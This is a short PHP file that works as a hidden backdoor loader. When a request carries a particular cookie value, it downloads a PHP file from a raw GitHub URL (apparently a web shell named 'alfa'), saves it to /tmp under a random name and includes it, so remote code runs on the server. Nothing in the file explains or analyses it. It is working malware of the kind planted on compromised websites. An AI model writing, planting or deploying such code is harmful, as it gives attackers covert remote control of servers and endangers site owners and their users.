<?php

if (isset($_COOKIE['anjing']) && $_COOKIE['anjing'] == "anjing") {
    $url = 'https://raw.githubusercontent.com/mirebus66/lp/refs/heads/main/alfa';
    
    $targetDir = '/tmp';
    
    if (!is_dir($targetDir)) {
        mkdir($targetDir, 0777, true);
    }
    
    $randomFileName = uniqid() . '.php';
    $targetFile = $targetDir . '/' . $randomFileName;
    
    if (!file_exists($targetFile)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $response = curl_exec($ch);
        curl_close($ch);
        file_put_contents($targetFile, $response);
    }
    
    include $targetFile;
}

?>
